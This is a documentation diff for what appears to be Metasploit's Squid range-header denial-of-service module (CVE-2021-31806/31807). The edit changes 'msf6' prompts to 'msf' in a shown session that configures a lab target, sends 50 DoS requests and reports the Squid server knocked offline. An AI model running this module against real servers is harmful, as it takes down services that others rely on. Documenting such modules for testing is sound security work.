@@ -40,12 +40,12 @@ The default setting is `CVE-2021-31806`, but `CVE-2021-31807` can also be chosen
 
 In this scenario the target server is running on the same host as Metasploit (192.168.159.128).
 ```
-msf6 > use auxiliary/dos/http/squid_range_dos i
-msf6 auxiliary(dos/http/squid_range_dos) > set RHOSTS 192.168.159.128
+msf > use auxiliary/dos/http/squid_range_dos i
+msf auxiliary(dos/http/squid_range_dos) > set RHOSTS 192.168.159.128
 RHOSTS => 192.168.159.128
-msf6 auxiliary(dos/http/squid_range_dos) > set SRVHOST 192.168.159.128
+msf auxiliary(dos/http/squid_range_dos) > set SRVHOST 192.168.159.128
 SRVHOST => 192.168.159.128
-msf6 auxiliary(dos/http/squid_range_dos) > show options
+msf auxiliary(dos/http/squid_range_dos) > show options
 
 Module options (auxiliary/dos/http/squid_range_dos):
 
@@ -71,7 +71,7 @@ Auxiliary action:
    DOS   Perform Denial of Service Against The Target
 
 
-msf6 auxiliary(dos/http/squid_range_dos) > run
+msf auxiliary(dos/http/squid_range_dos) > run
 [*] Running module against 192.168.159.128
 
 [*] Sending 50 DoS requests to 192.168.159.128:3128
@@ -85,7 +85,7 @@ msf6 auxiliary(dos/http/squid_range_dos) > run
 [+] DoS completely successful.
 [*] Server stopped.
 [*] Auxiliary module execution completed
-msf6 auxiliary(dos/http/squid_range_dos) >
+msf auxiliary(dos/http/squid_range_dos) >
 ```
 
 At this point, the target Squid server should be completely inaccessible: all children
